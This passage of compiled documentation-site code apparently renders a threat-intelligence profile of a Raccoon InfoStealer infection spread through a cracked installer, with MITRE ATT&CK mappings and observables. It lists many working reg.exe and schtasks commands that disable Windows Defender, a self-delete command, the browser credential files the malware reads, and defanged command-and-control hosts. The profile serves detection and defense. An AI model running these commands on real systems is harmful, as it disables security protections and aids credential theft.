/f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v \\"SpynetReporting\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\SpyNet\\" /v \\"SubmitSamplesConsent\\" /t REG_DWORD /d \\"2\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderApiLogger\\" /v \\"Start\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger\\\\DefenderAuditLogger\\" /v \\"Start\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cache Maintenance\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Scheduled Scan\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Verification\\" /Disable'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'schtasks  /Change /TN \\"Microsoft\\\\Windows\\\\Windows Defender\\\\Windows Defender Cleanup\\" /Disable'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\StartupApproved\\\\Run\\" /v \\"SecurityHealth\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\" /v \\"SecurityHealth\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKCR\\\\*\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKCR\\\\Directory\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg delete \\"HKCR\\\\Drive\\\\shellex\\\\ContextMenuHandlers\\\\EPP\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdBoot\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdFilter\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisDrv\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WdNisSvc\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg add \\"HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend\\" /v \\"Start\\" /t REG_DWORD /d \\"4\\" /f')),(0,l.kt)("td",{parentName:"tr",align:null},"- setting Start to 4 means disabling the service.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1140",(0,l.kt)("br",null),"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"AntiAV")," (an open source tool obfuscation tool) to obfuscate malware binary file for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\main.bat\\"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe")),(0,l.kt)("td",{parentName:"tr",align:null},"- Script available at VT ",(0,l.kt)("a",{parentName:"td",href:"https://www.virustotal.com/gui/file/a3d45f57d6b62b2d09c4dcca451bf06a0ef330664b796813841d7ea0934fcf06/content"},"https://www.virustotal.com/gui/file/a3d45f57d6b62b2d09c4dcca451bf06a0ef330664b796813841d7ea0934fcf06/content"),(0,l.kt)("br",null),"- detection rate 0/58 (Oct 2nd 2021)",(0,l.kt)("br",null),"- main.bat is an obfuscator ",(0,l.kt)("a",{parentName:"td",href:"https://github.com/hXR16F/AntiAV/"},"https://github.com/hXR16F/AntiAV/"),".",(0,l.kt)("br",null),"- door.exe is available at VT ",(0,l.kt)("a",{parentName:"td",href:"https://www.virustotal.com/gui/file/a1ff11c6e6e4aa54b60a2d44b6d2f05a48e6c617f0d89801a90ec56c29223b21"},"https://www.virustotal.com/gui/file/a1ff11c6e6e4aa54b60a2d44b6d2f05a48e6c617f0d89801a90ec56c29223b21"),(0,l.kt)("br",null),"- first submited around the time of this sighting.",(0,l.kt)("br",null),"- current detection is 45/69 (oct 2nd 2021)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to launch Raccoon InfoStealer for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"door.exe"')),(0,l.kt)("td",{parentName:"tr",align:null},"- door.exe is the info stealer.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used HTTP to download additional tools for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"195.201.225[.]248"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"telete[.]in"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"185.53.46[.]105"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C\\\\Users\\\\#{user}\\\\AppData\\\\LocalLow\\\\sqlite3.dll")),(0,l.kt)("td",{parentName:"tr",align:null},"- Process image file is not signed.",(0,l.kt)("br",null),"- IP addresses correspond to the Russian Federation",(0,l.kt)("br",null),"- IP addresses correspond to Czech Republic and Republic of Moldova",(0,l.kt)("br",null),"- SQLite is a software library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine.",(0,l.kt)("br",null),"- Threat Actors leverage SQLite to access the credential databases")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003",(0,l.kt)("br",null),"T1106"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"Native APIs")," to access Chrome credentials store for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Read"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data")),(0,l.kt)("td",{parentName:"tr",align:null},'- "',"\\","User Data","\\","Default","\\",'Login Data" is a SQlite3 database that stores the credentials of the Default profile',(0,l.kt)("br",null),"- Values are encrypted using Microsoft\ufffds Data Protection API (DPAPI)",(0,l.kt)("br",null),"- DPAPI consists of 2 functions -> CryptProtectData() and CryptUnprotectData() which symetrically encrypt/decrypt data.",(0,l.kt)("br",null),"- CryptUnprotectData function decrypts data using implicit crypto keys tied to a specific user or system.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Credential Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1555.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"SQlite3")," DLL to read Firefox credentials store for Credential Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Modified"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\cert9.db"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\Users\\#{user}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{random}.default-release\\key4.db")),(0,l.kt)("td",{parentName:"tr",align:null},"- cert9.db is a SQLite database that stores security certificate settings and SSL certificates imported into Firefox.",(0,l.kt)("br",null),"- key4.db is a SQLite database that stores passwords.",(0,l.kt)("br",null),"- logins.json stores (encrypted) passwords",(0,l.kt)("br",null),"- as a previous step, SQlite3 dll was downloaded.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Collection"),(0,l.kt)("td",{parentName:"tr",align:null},"T1560"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"unconfirmed method")," to create a ",(0,l.kt)("em",{parentName:"td"},".zip")," file for Collection."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\LocalLow\\\\bjZYHn4lcwr.zip")),(0,l.kt)("td",{parentName:"tr",align:null},"- it is not known to us, the method used to create the ",(0,l.kt)("em",{parentName:"td"},"zip")," file.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1567.002"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"cloud storage")," for Exfiltration."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"cdn.discordapp[.]com")),(0,l.kt)("td",{parentName:"tr",align:null},"- Discord is a VoIP, instant messaging and digital distribution platform.",(0,l.kt)("br",null),"- DNS Query events are precursory indicators of network ativity.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1070.004",(0,l.kt)("br",null),"T1059"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware used ",(0,l.kt)("em",{parentName:"td"},"CMD delayed command execution")," to delelete itself for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'cmd.exe /C timeout /T 10 /NOBREAK > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q "C:\\\\ProgramData\\\\IgHMwb34dcD\\\\door.exe"')),(0,l.kt)("td",{parentName:"tr",align:null},"- Via Timeout command a delay of 10 seconds is introduced.",(0,l.kt)("br",null),"- Via ping command a delay of 3000 miliseconds is introduced.",(0,l.kt)("br",null),"- Del is native cmd function for deleting files.")))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-search-engine-optimization-seo-poisoning-to-lure-users-for-initial-access"},"Threat actor used Search Engine Optimization (SEO) poisoning to lure users for Initial Access."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1189 - Drive-by Compromise"),(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1189"),(0,l.kt)("td",{parentName:"tr",align:null},"Chrome performs DNS Queries for suspicious domains (softwarebestever","[.]","fun, youtub","[.]","space)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"softwarebestever[.]fun"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"youtub[.]space"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Chrome drops ",(0,l.kt)("em",{parentName:"td"},".rar")," file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Downloads\\\\StellarDataRecoveryProfessional.rar"))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Search Engine Optimization (SEO) poisoning allows threat actors to rank their malicious resources higher in web searches."),(0,l.kt)("li",{parentName:"ul"},"In this case, apparently, the user is searching for a cracked version of a tool called Stellar Data Recovery."),(0,l.kt)("li",{parentName:"ul"},"softwarebestever","[.]","fun resolves to an IP address that corresponds to the Russian Federation"),(0,l.kt)("li",{parentName:"ul"},"There is osint that shows that softwarebestever","[.]","fun has served the file ",(0,l.kt)("em",{parentName:"li"},"StellarDataRecoveryProfessional.rar")," at some point in time (https://urlscan","[.]","io/search/#page.domain%3Asoftwarebestever.fun)"),(0,l.kt)("li",{parentName:"ul"},"Youtube video (",(0,l.kt)("a",{parentName:"li",href:"https://www.youtube.com/watch?v=GJW-PN_O4z8"},"https://www.youtube.com/watch?v=GJW-PN_O4z8"),") shows how to download and crack Stellar Data Recovery Professional."),(0,l.kt)("li",{parentName:"ul"},"youtub","[.]","space is part of the url provided in the description of the video (",(0,l.kt)("a",{parentName:"li",href:"https://www.youtube%5B.%5Dcom/redirect?event=video_description&redir_token=QUFFLUhqbEFBNzdjUXNuQklzWkdBSHFSYm1VN2Y0RkxDZ3xBQ3Jtc0tsN1NnVE5RODhvRlJ1cTlHamhBeG0tdFZhVFNFSG1SR2ZrS1ktWk9FMGlKQlZ5U0hJM2RKN05WWWN6TDFzWEliZ3cxU1JiYUZIVlVGb05NN0p0U2tGUC1ISVJvRlpVZlBzVU53aGxsZDRFbW9pQi1fdw&q=https%3A%2F%2Fyoutub%5B%5D.%5Dspace%2FStellarDataRecoveryProfessional"},"https://www.youtube[.]com/redirect?event=video_description&redir_token=QUFFLUhqbEFBNzdjUXNuQklzWkdBSHFSYm1VN2Y0RkxDZ3xBQ3Jtc0tsN1NnVE5RODhvRlJ1cTlHamhBeG0tdFZhVFNFSG1SR2ZrS1ktWk9FMGlKQlZ5U0hJM2RKN05WWWN6TDFzWEliZ3cxU1JiYUZIVlVGb05NN0p0U2tGUC1ISVJvRlpVZlBzVU53aGxsZDRFbW9pQi1fdw&q=https%3A%2F%2Fyoutub[].]space%2FStellarDataRecoveryProfessional"),")"),(0,l.kt)("li",{parentName:"ul"},"Unknown if user was maliciously redirected to perform this download"),(0,l.kt)("li",{parentName:"ul"},"StellarDataRecoveryProfessional.rar seems to be a cracked copy of Stellar Data Recovery Professional."),(0,l.kt)("li",{parentName:"ul"},"StellarDataRecoveryProfessional.rar file has no reputation at VT (Oct 2nd 2021)")),(0,l.kt)("h3",{id:"threat-actor-used-compromised-installers-to-lure-users-for-execution"},"Threat actor used compromised installers to lure users for Execution."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1204.002 - User Execution: Malicious File")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"User opened malicious .rar file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Program Files (x86)\\\\IZArc\\\\IZArc.exe\\" -ef C:\\\\Users\\\\#{user}\\\\Downloads C:\\\\Users\\\\#{user}\\\\Downloads\\\\StellarDataRecoveryProfessional.rar'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1204.002"),(0,l.kt)("td",{parentName:"tr",align:null},"User executed compromissed installer."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Downloads\\\\StellarDataRecoveryProfessional\\\\StellarDataRecoveryProfessional\\\\StellarDataRecovery-Professional.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"Multiple files created at %ProgramData% (including 7zip binary, batch files and Visual Basic scripts)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\7z.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\main.bat"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\STRTbbbn7przuvwav4hbpbps.vbs"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\DELbbbn7l3bnchd166d2hhhv.bat"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\AVDbbbn7i3b4ho55ck6raahj.bat"))))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"As parent process is Explorer, likely the user executed  the process."),(0,l.kt)("li",{parentName:"ul"},"IZArc.exe seems to be legit archiving functionality"),(0,l.kt)("li",{parentName:"ul"},"StellarDataRecovery-Professional.exe seems to be a fake or compromissed installer."),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.virustotal.com/gui/file/56783c2e395603404c92bc44ca0c39d4bbcc312edbf6d2349e367c232c5b8e57"},"https://www.virustotal.com/gui/file/56783c2e395603404c92bc44ca0c39d4bbcc312edbf6d2349e367c232c5b8e57")),(0,l.kt)("li",{parentName:"ul"},"13/69 detections at VT (Oct 2nd 2021)"),(0,l.kt)("li",{parentName:"ul"},"main.bat is related to ",(0,l.kt)("a",{parentName:"li",href:"https://github.com/hXR16F/AntiAV/blob/master/AntiAV.bat"},"https://github.com/hXR16F/AntiAV/blob/master/AntiAV.bat"),", and Anti AntiVirus project."),(0,l.kt)("li",{parentName:"ul"},"AntiAV obfuscates files using compression via 7zip")),(0,l.kt)("h3",{id:"threat-actor-used-visual-basic-scripts-to-launch-a-doscmdbatch-file-via-cmd-for-execution"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"Visual Basic scripts")," to launch a ",(0,l.kt)("em",{parentName:"h3"},"doscmd/batch")," file via ",(0,l.kt)("em",{parentName:"h3"},"CMD")," for Execution."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.005 - Command and Scripting Interpreter: Visual Basic"),(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.005"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware ran a Visual Basic script to launch execution of a batch file via CMD."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\WScript.exe\\" \\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\STRTbbbn7przuvwav4hbpbps.vbs\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware executed a batch file via CMD."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'C:\\\\Windows\\\\system32\\\\cmd.exe /c \\"\\"C:\\\\ProgramData\\\\IgHMwb34dcD\\\\AVDbbbn7i3b4ho55ck6raahj.bat\\" \\"'))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Script available at VT ",(0,l.kt)("a",{parentName:"li",href:"https://www.virustotal.com/gui/file/91ce5c5b2e5b19258d79f4da4dc087058a67c657f586c6c17cb5bef93070479e/content"},"https://www.virustotal.com/gui/file/91ce5c5b2e5b19258d79f4da4dc087058a67c657f586c6c17cb5bef93070479e/content")),(0,l.kt)("li",{parentName:"ul"},"detection rate 2/58 (Oct 2nd 2021)"),(0,l.kt)("li",{parentName:"ul"},"Script available at VT ",(0,l.kt)("a",{parentName:"li",href:"https://www.virustotal.com/gui/file/684985d417bc480cc3da17a8bd2a081ccb67a2c3315ce18abcb7c7b8ea5f8d58"},"https://www.virustotal.com/gui/file/684985d417bc480cc3da17a8bd2a081ccb67a2c3315ce18abcb7c7b8ea5f8d58")),(0,l.kt)("li",{parentName:"ul"},"detection rate 6/57 (Oct 2nd 2021)")),(0,l.kt)("h3",{id:"threat-actor-used-doscmdbatch-files-to-disable-windows-defender-via-multiple-regexe-and-schtasksexe-for-defense-evasion"},"Threat actor used ",(0,l.kt)("em",{parentName:"h3"},"doscmd/batch")," files to disable Windows Defender via multiple ",(0,l.kt)("em",{parentName:"h3"},"reg.exe")," and ",(0,l.kt)("em",{parentName:"h3"},"SCHTASKS.exe")," for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1562.001 - Impair Defenses: Disable or Modify Tools"),(0,l.kt)("li",{parentName:"ul"},"T1112 - Modify Registry")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1562.001",(0,l.kt)("br",null),"T1112"),(0,l.kt)("td",{parentName:"tr",align:null},"Malware launched ",(0,l.kt)("em",{parentName:"td"},"REG.exe")," (attempted to modify Windows Defender ",(0,l.kt)("em",{parentName:"td"},"policy configurations"),")."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Microsoft\\\\Windows Defender\\\\Features\\" /v \\"TamperProtection\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  delete \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v \\"DisableAntiSpyware\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\" /v \\"DisableAntiVirus\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\MpEngine\\" /v \\"MpEnablePus\\" /t REG_DWORD /d \\"0\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableBehaviorMonitoring\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add \\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\\" /v \\"DisableIOAVProtection\\" /t REG_DWORD /d \\"1\\" /f'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'reg  add 